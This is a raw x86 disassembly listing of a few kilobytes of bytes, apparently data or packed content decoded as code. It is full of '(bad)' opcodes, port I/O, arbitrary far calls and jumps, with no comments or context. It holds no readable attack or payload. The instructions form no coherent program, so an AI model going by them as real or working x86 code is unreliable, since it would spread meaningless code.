  488eae:	sar    DWORD PTR [ecx+0x26],0x10
  488eb2:	mov    dh,0xd0
  488eb4:	aam    0xf0
  488eb6:	repz jge 0x488f23
  488eb9:	hlt    
  488eba:	jg     0x488e98
  488ebc:	inc    ebx
  488ebd:	in     al,0xfc
  488ebf:	xchg   ebx,eax
  488ec0:	dec    eax
  488ec1:	xor    dl,BYTE PTR [edx-0x60]
  488ec4:	rcr    DWORD PTR [edx+0x4b4bdc13],cl
  488eca:	xchg   ebp,eax
  488ecb:	xchg   ecx,eax
  488ecc:	retf   0x4ba6
  488ecf:	add    BYTE PTR [ebp-0x56b3b3b4],cl
  488ed5:	mov    WORD PTR [edi+esi*1],?
  488ed8:	pop    edx
  488ed9:	fadd   DWORD PTR [esi+0x4c]
  488edc:	dec    esp
  488edd:	dec    esp
  488ede:	sub    edx,DWORD PTR [edi+0x7167b29b]
  488ee4:	xor    DWORD PTR [eax+0x64],esp
  488ee7:	fstp   QWORD PTR [edx-0x61b1a354]
  488eed:	inc    ebp
  488eee:	add    BYTE PTR [eax+ecx*4+0x72a5b1a3],0x39
  488ef6:	test   eax,0x3faca8a4
  488efb:	sahf   
  488efc:	sub    edx,DWORD PTR [edi-0x33063725]
  488f02:	sar    BYTE PTR [ecx+ecx*4],1
  488f05:	inc    ebp
  488f06:	in     al,dx
  488f07:	(bad)  
  488f08:	mov    eax,0xf4f04e5c
  488f0d:	mov    eax,ebp
  488f0f:	push   esp
  488f10:	ss xchg ebp,eax
  488f12:	xchg   ecx,eax
  488f13:	dec    ebp
  488f14:	dec    ebp
  488f15:	dec    ebp
  488f16:	mov    edi,0x61fa4d75
  488f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  488f1c:	mov    WORD PTR [ebp+0xb],cs
  488f1f:	xor    eax,0x4c001ffc
  488f24:	jmp    0x8dc47743
  488f29:	or     bl,ah
  488f2b:	xchg   ebx,eax
  488f2c:	ror    DWORD PTR [ebx+ebp*1+0x24],1
  488f30:	inc    ecx
  488f31:	sbb    ch,al
  488f33:	jae    0x488f61
  488f35:	enter  0xc993,0x4c
  488f39:	idiv   DWORD PTR [ecx+0x7]
  488f3c:	jp     0x488f50
  488f3e:	or     cl,cl
  488f40:	cmp    al,al
  488f42:	mov    ds:0x2b2b5968,eax
  488f47:	out    dx,eax
  488f48:	fsubr  DWORD PTR [ebp+eax*2+0x74]
  488f4c:	cwde   
  488f4d:	mov    al,0x15
  488f4f:	mov    WORD PTR ds:0xf2a71490,ss
  488f55:	cs cwde 
  488f57:	pop    esp
  488f58:	mov    al,ds:0x4a975ab0
  488f5d:	in     eax,0xf9
  488f5f:	daa    
  488f60:	mov    esp,0xe0d8d48c
  488f65:	repz push edx
  488f67:	test   eax,0xfcf87c3c
  488f6c:	add    al,0x4d
  488f6e:	cmp    al,0x95
  488f70:	iret   
  488f71:	dec    edx
  488f72:	fs sbb al,0x4d
  488f75:	and    BYTE PTR [ebp+0x28],cl
  488f78:	dec    esp
  488f79:	mov    esp,edi
  488f7b:	push   edx
  488f7c:	test   eax,0x3c4c4440
  488f81:	lods   eax,DWORD PTR ds:[esi]
  488f82:	in     eax,0x72
  488f84:	shl    BYTE PTR [ecx+0x36],cl
  488f87:	mov    al,0x1d
  488f89:	pop    eax
  488f8a:	pop    esp
  488f8b:	pusha  
  488f8c:	sub    dl,BYTE PTR [edi-0x50d9916d]
  488f92:	xor    DWORD PTR [eax+eax*4-0x7c],edi
  488f96:	mov    bh,0xb2
  488f98:	jb     0x488fd3
  488f9a:	stc    
  488f9b:	arpl   WORD PTR [eax-0x74ca575c],sp
  488fa1:	xchg   edi,eax
  488fa2:	retf   0xa4e5
  488fa5:	(bad)  
  488fa6:	enter  0x4cc,0xe8
  488faa:	lods   al,BYTE PTR ds:[esi]
  488fab:	lods   al,BYTE PTR ds:[esi]
  488fac:	pop    esp
  488fad:	outs   dx,BYTE PTR ds:[esi]
  488fae:	xor    esp,ebp
  488fb0:	lock pop ds
  488fb2:	xchg   BYTE PTR [esi+ecx*2],cl
  488fb5:	test   eax,0x108e567c
  488fba:	dec    esi
  488fbb:	adc    al,0x4e
  488fbd:	(bad)  
  488fbe:	scas   al,BYTE PTR es:[edi]
  488fbf:	xor    BYTE PTR [edx+esi*4+0x38343972],ah
  488fc6:	jno    0x488f79
  488fc8:	push   esp
  488fc9:	xchg   ebx,eax
  488fca:	retf   0xe5ca
  488fcd:	pop    eax
  488fce:	pop    esp
  488fcf:	and    DWORD PTR [ecx+0x2b9e4e78],ebp
  488fd5:	xchg   edi,eax
  488fd6:	jl     0x488f58
  488fd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488fd9:	ins    BYTE PTR es:[edi],dx
  488fda:	inc    edi
  488fdb:	pushf  
  488fdc:	mov    al,ds:0x5cae1a54
  488fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  488fe2:	inc    edi
  488fe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  488fe4:	inc    ebp
  488fe5:	dec    esp
  488fe6:	fs push 0xb9e55d2e
  488fec:	jo     0x48901a
  488fee:	mov    BYTE PTR [edi],ah
  488ff0:	mov    WORD PTR [edi+ecx*8+0x207952a5],ss
  488ff7:	lods   al,BYTE PTR ds:[esi]
  488ff8:	mov    al,0xb8
  488ffa:	or     al,0xf3
  488ffc:	mov    ecx,0xd4d02a54
  489001:	fdiv   st(0),st
  489003:	xchg   edx,eax
  489004:	push   esi
  489005:	call   0x4e00:0xf8f4ca97
  48900c:	in     al,dx
  48900d:	sbb    BYTE PTR [esi+0x4a],cl
  489010:	in     eax,0xa9
  489012:	jl     0x489030
  489014:	dec    esi
  489015:	and    al,0xe0
  489017:	cmp    al,0x52
  489019:	test   eax,0x4840973c
  48901e:	int3   
  48901f:	pusha  
  489020:	fs pop esp
  489022:	sub    dl,BYTE PTR [ebp-0x7b3b9319]
  489028:	mov    BYTE PTR [eax-0x709aa0d],dl
  48902e:	lods   al,BYTE PTR ds:[esi]
  48902f:	xchg   edx,eax
  489030:	pop    ecx
  489031:	test   al,0x4e
  489033:	lods   al,BYTE PTR ds:[esi]
  489034:	sub    esi,DWORD PTR [edx+esi*2-0x5b31fe9c]
  48903b:	sahf   
  48903c:	ror    BYTE PTR [esi-0x3c],0x4e
  489040:	mov    ah,0xf2
  489042:	sbb    eax,0xcc4ec8b2
  489047:	and    eax,edx
  489049:	ss popf 
  48904b:	pop    ecx
  48904c:	stc    
  48904d:	and    cl,BYTE PTR ds:0xec314e0f
  489053:	push   es
  489054:	pushf  
  489055:	stc    
  489056:	lods   al,BYTE PTR ds:[esi]
  489057:	sbb    al,0x59
  489059:	or     BYTE PTR [edi+0xc],cl
  48905c:	dec    edi
  48905d:	adc    BYTE PTR [edi+0x41],cl
  489060:	fwait
  489061:	gs in  eax,0x72
  489064:	push   edx
  489065:	sub    al,0x30
  489067:	xor    al,0xab
  489069:	mov    cs,edi
  48906b:	xchg   ebp,eax
  48906c:	retf   
  48906d:	dec    ecx
  48906e:	push   eax
  48906f:	push   esp
  489070:	pop    eax
  489071:	lea    ebp,[ebp+0x47]
  489074:	je     0x4890ef
  489076:	push   edi
  489077:	cs daa 
  489079:	js     0x4890f7
  48907b:	mov    esp,0x98c644a7
  489080:	(bad)  [ebp-0x5f63c68e]
  489086:	push   es
  489087:	mov    esp,0x2a5c9c31
  48908c:	xchg   edi,eax
  48908d:	rol    ah,0x7c
  489090:	loopne 0x489076
  489092:	xchg   ecx,eax
  489093:	(bad)  
  489094:	pop    eax
  489095:	mov    ecx,0x218bc9e8
  48909a:	push   eax
  48909b:	cmp    al,0xf
  48909d:	aaa    
  48909e:	xchg   ebp,eax
  48909f:	push   eax
  4890a0:	push   eax
  4890a1:	or     DWORD PTR [ebx-0x732783b9],ebx
  4890a7:	out    0x5d,eax
  4890a9:	jbe    0x489053
  4890ab:	lock push ebx
  4890ad:	cmp    eax,0x6c28fcf4
  4890b2:	push   edx
  4890b3:	mov    al,ds:0x84440b53
  4890b8:	dec    eax
  4890b9:	dec    edi
  4890ba:	fbstp  TBYTE PTR [ebx+0x58120bc3]
  4890c0:	fstp   TBYTE PTR [eax]
  4890c2:	dec    edi
  4890c3:	cmp    al,0x3b
  4890c5:	inc    esp
  4890c6:	stc    
  4890c7:	sub    bh,BYTE PTR [edi]
  4890c9:	cmp    al,0x38
  4890cb:	fistp  DWORD PTR [edi+ecx*2+0x60]
  4890cf:	sub    ebp,DWORD PTR [eax-0x8]
  4890d2:	jl     0x4890b1
  4890d4:	in     eax,0x20
  4890d6:	adc    BYTE PTR [ebp-0x7c],0x29
  4890da:	mov    WORD PTR [edx+edx*4],cs
  4890dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4890de:	or     al,0xd2
  4890e0:	adc    BYTE PTR [ebp+0x4f],ch
  4890e3:	dec    edi
  4890e4:	mov    al,0xe5
  4890e6:	stc    
  4890e7:	sub    cl,bh
  4890e9:	cld    
  4890ea:	xchg   ecx,eax
  4890eb:	enter  0x27cc,0xd4
  4890ef:	in     al,0xc2
  4890f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4890f2:	ins    DWORD PTR es:[edi],dx
  4890f3:	pop    edi
  4890f4:	in     al,dx
  4890f5:	sbb    eax,0xf81265f0
  4890fa:	aam    0x91
  4890fc:	cld    
  4890fd:	xchg   esp,eax
  4890fe:	retf   0x90dd
  489101:	or     eax,0xa505010
  489106:	pusha  
  489107:	dec    esp
  489108:	dec    eax
  489109:	pop    ebp
  48910a:	mov    ecx,0x28da1c9c
  48910f:	sub    al,0x30
  489111:	retf   
  489112:	clc    
  489113:	inc    esi
  489114:	retf   0xe5ca
  489117:	in     al,0x30
  489119:	dec    esp
  48911a:	push   eax
  48911b:	push   esp
  48911c:	cli    
  48911d:	lds    ebx,FWORD PTR [esi+0x7093972b]
  489123:	je     0x48919d
  489125:	neg    BYTE PTR [edi+eax*2-0x6c]
  489129:	xor    eax,0x984e5cae
  48912e:	pushf  
  48912f:	repz into 
  489131:	inc    esi
  489132:	sub    BYTE PTR [esi+0x50c8ca9b],bl
  489138:	push   eax
  489139:	push   eax
  48913a:	les    eax,FWORD PTR [eax-0x26a9afbb]
  489140:	push   esp
  489141:	inc    esi
  489142:	push   eax
  489143:	push   eax
  489144:	push   0x59
  489146:	push   ecx
  489147:	xor    DWORD PTR [ecx-0x1b],ecx
  48914a:	mov    bl,0x72
  48914c:	add    al,0x51
  48914e:	or     BYTE PTR [ecx-0x4b],dl
  489151:	pop    eax
  489152:	and    al,0x27
  489154:	xchg   ebp,eax
  489155:	xchg   ebp,eax
  489156:	retf   
  489157:	sub    BYTE PTR [edx+eiz*2],ch
  48915a:	pop    edx
  48915b:	dec    eax
  48915c:	dec    esp
  48915d:	pushf  
  48915e:	push   esp
  48915f:	push   esi
  489160:	cs push eax
  489162:	mov    DWORD PTR [esp+ebp*2+0x70],edx
  489166:	pusha  
  489167:	(bad)  
  489168:	pop    eax
  489169:	mov    ecx,0x79fc074
  48916e:	adc    al,0x5e
  489170:	nop
  489171:	dec    edx
  489172:	and    DWORD PTR [edx+0x50],esp
  489175:	push   eax
  489176:	adc    al,al
  489178:	jns    0x489159
  48917a:	push   es
  48917b:	sbb    eax,0x3525588f
  489180:	pop    esp
  489181:	cmp    eax,0xde982864
  489186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489187:	dec    ebp
  489188:	ficom  DWORD PTR [eax+0x7c]
  48918b:	xor    al,BYTE PTR [eax-0x357ba378]
  489191:	rep lods eax,DWORD PTR ds:[esi]
  489193:	push   esp
  489194:	mov    al,ds:0xac29a40d
  489199:	je     0x489144
  48919b:	mov    esp,0xb9c4be43
  4891a0:	enter  0x30d0,0x64
  4891a4:	call   0x72658449
  4891a9:	in     al,dx
  4891aa:	hlt    
  4891ab:	cmp    BYTE PTR [edx+ebp*1],cl
  4891ae:	(bad)  
  4891b0:	fsub   DWORD PTR [edi]
  4891b2:	adc    BYTE PTR [ecx-0x6f],dl
  4891b5:	or     cl,BYTE PTR [eax]
  4891b7:	daa    
  4891b8:	xor    BYTE PTR [edx+ebp*1],dh
  4891bb:	xlat   BYTE PTR ds:[ebx]
  4891bc:	clc    
  4891bd:	pop    esp
  4891be:	cmp    al,0x0
  4891c0:	xchg   ecx,eax
  4891c1:	sub    al,0x51
  4891c3:	push   ecx
  4891c4:	in     al,0xf2
  4891c6:	jl     0x489209
  4891c8:	xor    ah,dh
  4891ca:	nop
  4891cb:	js     0x489249
  4891cd:	sbb    al,BYTE PTR [edx]
  4891cf:	out    0x39,eax
  4891d1:	test   al,bl
  4891d3:	adc    DWORD PTR [ecx+0x32],edx
  4891d6:	push   edx
  4891d7:	fst    DWORD PTR [ecx+edx*2-0xf]
  4891db:	sahf   
  4891dc:	push   ecx
  4891dd:	push   ecx
  4891de:	jl     0x489171
  4891e0:	retf   0x51a6
  4891e3:	xchg   ebp,eax
  4891e4:	outs   dx,BYTE PTR ds:[esi]
  4891e5:	push   ecx
  4891e6:	arpl   ax,sp
  4891e8:	push   esp
  4891e9:	arpl   WORD PTR [ecx-0x38b0954],bp
  4891ef:	xor    al,0x52
  4891f1:	xchg   bp,ax
  4891f3:	aad    0xa8
  4891f5:	push   edx
  4891f6:	push   ds
  4891f7:	ins    DWORD PTR es:[edi],dx
  4891f8:	cmp    dl,BYTE PTR [edx+0x31]
  4891fb:	and    al,0x39
  4891fd:	test   eax,0xae285cac
  489202:	dec    esi
  489203:	inc    esp
  489204:	dec    eax
  489205:	in     al,0x5b
  489207:	mov    eax,0x7e3f4c72
  48920c:	inc    ebp
  48920d:	jb     0x489261
  48920f:	and    edx,DWORD PTR [ebp+0x5252654d]
  489215:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489216:	push   edi
  489217:	push   edx
  489218:	push   edx
  489219:	sbb    DWORD PTR [ecx-0x3badd594],ebp
  48921f:	push   ebp
  489220:	push   edx
  489221:	push   edx
  489222:	das    
  489223:	aaa    
  489224:	gs push ebx
  489226:	push   edx
  489227:	fnstcw WORD PTR [edx+0x31]
  48922a:	fcomp  st(4)
  48922c:	push   edx
  48922d:	pop    esp
  48922e:	stc    
  48922f:	mov    es,WORD PTR [eax]
  489231:	inc    edi
  489232:	loopne 0x489255
  489234:	in     al,0x6b
  489236:	adc    ecx,DWORD PTR [eax-0x1b]
  489239:	stc    
  48923a:	mov    al,0xf2
  48923c:	clc    
  48923d:	xor    eax,0x7a0499c
  489242:	sbb    esp,DWORD PTR [edi+eiz*4-0x31]
  489246:	test   al,0xbc
  489248:	nop
  489249:	aad    0xc0
  48924b:	push   ecx
  48924c:	les    eax,FWORD PTR [edi-0xd]
  48924f:	mov    eax,ds:0xa4cce7d5
  489254:	nop
  489255:	mov    ebx,0x9ae8e3e4
  48925a:	push   ebp
  48925b:	sahf   
  48925c:	retf   
  48925d:	or     al,dh
  48925f:	mov    WORD PTR [eax],cs
  489261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489262:	or     BYTE PTR [esp+edx*2],cl
  489265:	sub    cl,ch
  489267:	jbe    0x48928f
  489269:	adc    al,0x52
  48926b:	je     0x489299
  48926d:	xor    BYTE PTR [edi+0x38b9e54a],dl
  489273:	pop    eax
  489274:	push   eax
  489275:	push   esp
  489276:	pop    esp
  489277:	out    0x52,eax
  489279:	test   eax,0x78743c3c
  48927e:	sub    cl,0x65
  489281:	mov    ah,0xc6
  489283:	sbb    al,0x90
  489285:	cmp    eax,0x7c522752
  48928a:	fucom  st(5)
  48928c:	add    eax,0x5dbc0432
  489291:	sar    BYTE PTR ds:0xe79c6fc8,0xfd
  489298:	fmul   QWORD PTR [edi-0x3b13edb8]
  48929e:	out    dx,eax
  48929f:	inc    esi
  4892a0:	sahf   
  4892a1:	fwait
  4892a2:	dec    edx
  4892a3:	push   edx
  4892a4:	push   ebx
  4892a5:	jge    0x4892b9
  4892a7:	dec    eax
  4892a8:	push   ebx
  4892a9:	push   ebx
  4892aa:	retf   
  4892ab:	dec    ebp
  4892ac:	fst    DWORD PTR [ebx+edx*2-0x43]
  4892b0:	xchg   esp,eax
  4892b1:	xor    DWORD PTR [esp+ebx*2+0x4e],eax
  4892b5:	cs xchg ebp,eax
  4892b7:	dec    eax
  4892b8:	shl    DWORD PTR [eax+ebp*2+0x6c],cl
  4892bc:	in     eax,0x72
  4892be:	jb     0x489269
  4892c0:	pop    es
  4892c1:	mov    BYTE PTR [eax+edx*4+0x6549cb95],cl
  4892c8:	clc    
  4892c9:	scas   al,BYTE PTR es:[edi]
  4892ca:	lods   al,BYTE PTR ds:[esi]
  4892cb:	mov    al,0xb4
  4892cd:	lahf   
  4892ce:	push   esi
  4892cf:	cs daa 
  4892d1:	xchg   ebp,eax
  4892d2:	test   eax,0xabd8d4d0
  4892d7:	mov    dh,0xa9
  4892d9:	mov    esp,?
  4892db:	push   ss
  4892dc:	ja     0x489331
  4892de:	push   ebx
  4892df:	push   ebx
  4892e0:	push   esp
  4892e1:	add    DWORD PTR [edi+0x54b4cfb2],esp
  4892e7:	cmp    dl,BYTE PTR [edi+esi*4-0xe]
  4892eb:	or     eax,0x282154a9
  4892f0:	xor    BYTE PTR [edx-0x346d90ad],0x49
  4892f7:	cmp    al,0x40
  4892f9:	inc    esp
  4892fa:	dec    eax
  4892fb:	and    DWORD PTR [edx+0x29],edx
  4892fe:	rcl    BYTE PTR [ebp+0x46beb24c],1
  489304:	dec    esp
  489305:	push   ebx
  489306:	push   ebx
  489307:	in     al,0x1b
  489309:	call   0x8fe8a519
  48930e:	dec    esp
  48930f:	xor    DWORD PTR [edi*1+0x3439f02f],ebp
  489316:	mov    BYTE PTR [edi+0x50534c34],cl
  48931c:	ja     0x48930a
  48931e:	ret    
  48931f:	repz aas 
  489321:	pop    eax
  489322:	jo     0x4892f3
  489324:	jo     0x489379
  489326:	je     0x4892c0
  489328:	mov    dl,0xab
  48932a:	cmp    al,0x97
  48932c:	push   es
  48932d:	jl     0x489387
  48932f:	xchg   esp,eax
  489330:	gs or  eax,0xc2df3c98
  489336:	out    0xa0,eax
  489338:	push   eax
  489339:	(bad)  
  48933a:	aam    0x53
  48933c:	push   ebx
  48933d:	repz jge 0x4892d7
  489340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  489341:	mov    eax,0xe053dc40
  489346:	sub    ebp,eax
  489348:	add    eax,0x2ce35ca9
  48934d:	(bad)  
  48934e:	dec    esi
  48934f:	push   esp
  489350:	push   esp
  489351:	repz push esp
  489353:	mov    esi,0xeb1412ef
  489358:	xor    BYTE PTR [edx],dl
  48935a:	cld    
  48935b:	mov    ss,WORD PTR [esp+ebp*8+0x24]
  48935f:	xchg   edi,eax
  489360:	xchg   ebx,eax
  489361:	xchg   BYTE PTR [edx+0x60],cl
  489364:	fs push 0xcb959527
  48936a:	ins    BYTE PTR es:[edi],dx
  48936b:	jo     0x489344
  48936d:	mov    ecx,0x37c88884
  489372:	scas   al,BYTE PTR es:[edi]
  489373:	jl     0x4893a6
  489375:	mov    WORD PTR [eax+0x54f640c6],?
  48937b:	mov    ecx,0x63be5655
  489380:	mov    al,0x95
  489382:	dec    esi
  489383:	int3   
  489384:	xor    eax,edx
  489386:	retf   
  489387:	leave  
  489388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489389:	jb     0x48935f
  48938b:	jl     0x48937d
  48938d:	hlt    
  48938e:	retf   0xcf91
  489391:	xchg   ebp,eax
  489392:	clc    
  489393:	lds    edx,FWORD PTR [ecx]
  489395:	dec    eax
  489396:	adc    al,0x55
  489398:	sbb    BYTE PTR [ebp+0x2e],dl
  48939b:	daa    
  48939c:	xchg   ebp,eax
  48939d:	iret   
  48939e:	sbb    al,0x55
  4893a0:	and    DWORD PTR [edx],edx
  4893a2:	cmp    BYTE PTR [eax+eax*2],bh
  4893a5:	mov    ecx,0x47573c9c
  4893aa:	pop    eax
  4893ab:	inc    esi
  4893ac:	pop    esp
  4893ad:	pusha  
  4893ae:	fs in  eax,0x72
  4893b1:	repnz pop esp
  4893b3:	mov    ah,0x9e
  4893b5:	inc    edi
  4893b6:	add    BYTE PTR [eax+ecx*4+0x6549cb95],0x36
  4893be:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4893c0:	test   al,0xac
  4893c2:	hlt    
  4893c3:	shl    BYTE PTR [eax],1
  4893c5:	iret   
  4893c6:	ret    
  4893c7:	xor    eax,0xd8782847
  4893cc:	push   eax
  4893cd:	jns    0x489419
  4893cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4893d0:	(bad)  
  4893d1:	push   esp
  4893d2:	push   esp
  4893d3:	sub    ah,cl
  4893d5:	mov    ah,0xa5
  4893d7:	repnz push cs
  4893d9:	stc    
  4893da:	lods   eax,DWORD PTR ds:[esi]
  4893db:	mov    eax,0xd8c45ac0
  4893e0:	xchg   ebp,eax
  4893e1:	lods   eax,DWORD PTR ds:[esi]
  4893e2:	ds (bad) 
  4893e5:	cmp    eax,0xc58eb8e4
  4893ea:	cld    
  4893eb:	push   esp
  4893ec:	add    BYTE PTR [esi+edi*2+0x6f],dl
  4893f0:	nop
  4893f1:	push   ebp
  4893f2:	or     BYTE PTR [edx],dl
  4893f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4893f5:	xor    esp,DWORD PTR [eax]
  4893f7:	push   ebp
  4893f8:	and    al,0xcb
  4893fa:	fdivr  DWORD PTR ds:0x91942c87
  489400:	inc    esp
  489401:	push   ebp
  489402:	in     eax,0x1a
  489404:	lahf   
  489405:	iret   
  489406:	inc    ebp
  489407:	cmp    eax,0x1e8e8850
  48940c:	push   ebp
  48940d:	pop    esp
  48940e:	sub    ch,BYTE PTR [edi]
  489410:	dec    eax
  489411:	push   ebp
  489412:	xor    BYTE PTR [eax-0x74],ch
  489415:	nop
  489416:	mov    dl,0x52
  489418:	jns    0x4893a1
  48941a:	cwde   
  48941b:	mov    WORD PTR [eax+esi*4+0xd],ss
  48941f:	mov    ah,0x23
  489421:	fnstsw WORD PTR [eax]
  489423:	out    dx,eax
  489424:	mov    esp,0x55fe3c28
  489429:	push   ebp
  48942a:	sbb    DWORD PTR [ecx+0x22552a6c],ebp
  489430:	jle    0x489487
  489432:	push   ebp
  489433:	xchg   ebp,eax
  489434:	xchg   ecx,eax
  489435:	out    0x53,eax
  489437:	push   ebp
  489438:	adc    DWORD PTR [eax+0x56],ecx
  48943b:	push   esi
  48943c:	push   esi
  48943d:	in     eax,0x72
  48943f:	push   ebx
  489440:	ss in  eax,0x7b
  489443:	xor    DWORD PTR [eax],edi
  489445:	cmp    al,0x95
  489447:	retf   
  489448:	dec    ecx
  489449:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  48944b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48944c:	pop    eax
  48944d:	pop    esp
  48944e:	pusha  
  48944f:	mov    al,0x57
  489451:	cs daa 
  489453:	iret   
  489454:	rol    DWORD PTR [eax+0x7c],cl
  489457:	add    BYTE PTR [esi+edi*8-0x46a3b9a9],0x9c
  48945f:	cmp    al,0xa0
  489461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489462:	test   al,0x32
  489464:	mov    es,WORD PTR [ebp+0x65]
  489467:	in     eax,0x72
  489469:	repnz (bad) 
  48946b:	enter  0x94cc,0x9a
  48946f:	das    
  489470:	xchg   ebp,eax
  489471:	retf   
  489472:	dec    ecx
  489473:	call   0xcc78564
  489478:	push   edi
  489479:	pop    esp
  48947a:	sahf   
  48947b:	xchg   ebp,eax
  48947c:	and    edx,DWORD PTR [eax]
  48947e:	push   edi
  48947f:	adc    al,0x57
  489481:	stos   BYTE PTR es:[edi],al
  489482:	xor    BYTE PTR [ebx-0x38],dh
  489485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489486:	rcr    DWORD PTR [edx-0x2c],0xd8
  48948a:	loopne 0x48947b
  48948c:	pop    ebx
  48948d:	pushf  
  48948e:	retf   0xf820
  489491:	pop    edx
  489492:	cmp    eax,0xf2fc9a04
  489497:	push   esp
  489498:	push   esi
  489499:	mov    esi,0x561c288d
  48949e:	and    BYTE PTR [esi+0x28],dl
  4894a1:	call   0xb02103d0
  4894a6:	inc    eax
  4894a7:	sbb    eax,0x4c855644
  4894ac:	xor    al,ah
  4894ae:	fs xor eax,0x3a66973e
  4894b4:	push   0x405dd870
  4894b9:	dec    ebx
  4894ba:	in     eax,0xf9
  4894bc:	into   
  4894bd:	push   esi
  4894be:	adc    DWORD PTR [esp+ecx*8-0x18394654],0xa4b8b090
  4894c9:	lea    ecx,[edx+0x56]
  4894cc:	and    ebp,ebp
  4894ce:	cmp    al,0xe5
  4894d0:	push   esi
  4894d1:	mov    BYTE PTR es:[esi-0xc],cl
  4894d5:	xchg   ebp,eax
  4894d6:	int    0x5f
  4894d8:	iret   
  4894d9:	clc    
  4894da:	pop    es
  4894db:	lods   eax,DWORD PTR ds:[esi]
  4894dc:	add    BYTE PTR [edi+0x74],dl
  4894df:	lea    ebx,[eax]
  4894e1:	call   0x57de24a2
  4894e6:	sbb    al,0x57
  4894e8:	xchg   ebp,eax
  4894e9:	sub    bl,BYTE PTR [eax+0x52]
  4894ec:	fst    DWORD PTR [edx+ebx*1+0xf]
  4894f0:	push   edi
  4894f1:	push   edi
  4894f2:	or     BYTE PTR [esi-0x59186ea9],ah
  4894f8:	xor    dl,BYTE PTR [edi+0x57]
  4894fb:	push   ss
  4894fc:	test   al,0x44
  4894fe:	push   edi
  4894ff:	jb     0x489554
  489501:	ss xchg ebp,eax
  489503:	push   edi
  489504:	push   edi
  489505:	stc    
  489506:	loopne 0x489539
  489508:	mov    al,ds:0xe573c9cb
  48950d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48950e:	call   0x6e5c:0xc4c046f5
  489515:	xchg   ebp,eax
  489516:	xchg   ebp,eax
  489517:	enter  0xae76,0xe4
  48951b:	xchg   ebp,eax
  48951c:	call   0x7cd6ec0d
  489521:	scas   al,BYTE PTR es:[edi]
  489522:	push   ecx
  489523:	je     0x48956a
  489525:	or     BYTE PTR [eax+0xc],bl
  489528:	pop    eax
  489529:	adc    BYTE PTR [eax-0x36],bl
  48952c:	in     eax,0x76
  48952e:	jns    0x4894ee
  489530:	sub    al,0x31
  489532:	xor    BYTE PTR [ebx+ebp*1],dh
  489535:	xchg   edi,eax
  489536:	xchg   ebx,eax
  489537:	out    0xe3,eax
  489539:	scas   eax,DWORD PTR es:[edi]
  48953a:	inc    ebp
  48953b:	push   eax
  48953c:	push   esp
  48953d:	pop    eax
  48953e:	xchg   esi,eax
  48953f:	jo     0x4894ed
  489541:	pop    esp
  489542:	dec    esi
  489543:	sub    dh,BYTE PTR [eax+edi*2+0x7c]
  489547:	push   0x62144673
  48954c:	test   eax,0xed579c98
  489551:	cmp    DWORD PTR [esi],0xa121797
  489557:	dec    eax
  489558:	dec    esp
  489559:	lea    ebp,[esi+0x4a]
  48955c:	in     eax,0x29
  48955e:	iret   
  48955f:	push   edi
  489560:	push   edi
  489561:	es cmp al,0x84
  489564:	push   0x88973cac
  489569:	nop
  48956a:	sbb    BYTE PTR [eax-0x30d5a3a9],ch
  489570:	out    0x1,eax
  489572:	sub    DWORD PTR [eax+eax*1-0x52092f34],esi
  489579:	icebp  
  48957a:	mov    ecx,0x6c8ce8d8
  48957f:	sbb    eax,0xb7cfe9f4
  489584:	lock cmp esp,edi
  489587:	ror    BYTE PTR [eax+ebp*8+0xb7c5858],1
  48958e:	iret   
  48958f:	pop    esi
  489590:	sbb    esp,DWORD PTR [eax]
  489592:	pop    eax
  489593:	mov    eax,gs
  489595:	pop    eax
  489596:	stos   DWORD PTR es:[edi],eax
  489597:	je     0x489568
  489599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48959a:	sub    DWORD PTR [eax+ebp*4+0x51],eax
  48959e:	pop    esp
  48959f:	pusha  
  4895a0:	daa    
  4895a1:	pop    esp
  4895a2:	sub    dl,BYTE PTR [ebp-0x7f6f9719]
  4895a8:	test   BYTE PTR [esi+eiz*4+0x74f3a052],cl
  4895af:	or     al,0x58
  4895b1:	pop    eax
  4895b2:	aaa    
  4895b3:	xchg   ebp,eax
  4895b4:	xchg   ecx,eax
  4895b5:	out    0xe1,eax
  4895b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4895b8:	inc    esi
  4895b9:	pop    eax
  4895ba:	pop    eax
  4895bb:	pop    eax
  4895bc:	rol    DWORD PTR [edi+eax*2-0x4e],cl
  4895c0:	test   eax,0x58583c8c
  4895c5:	pop    eax
  4895c6:	in     al,0x71
  4895c8:	retf   0xe567
  4895cb:	lods   al,BYTE PTR ds:[esi]
  4895cc:	pop    ecx
  4895cd:	xor    DWORD PTR [eax],ecx
  4895cf:	pop    ecx
  4895d0:	or     al,0x59
  4895d2:	test   BYTE PTR [ebp+0x5d],ch
  4895d5:	sub    dl,BYTE PTR [edi+0x302c2893]
  4895db:	out    0x4c,eax
  4895dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4895de:	mov    dl,0x72
  4895e0:	mov    ecx,0x2a545063
  4895e5:	imul   esi,DWORD PTR [eax+0x6e],0xffffff97
  4895e9:	retf   0x74e5
  4895ec:	js     0x48960d
  4895ee:	xchg   esp,eax
  4895ef:	xor    DWORD PTR [eax+0x5caca939],ebx
  4895f5:	pushf  
  4895f6:	addr16 jo 0x4895b1
  4895f9:	mov    esp,0x72b2a4e5
  4895fe:	ror    BYTE PTR [ecx],0x6f
  489601:	fsubr  st(0),st
  489603:	inc    eax
  489604:	retf   0xcaca
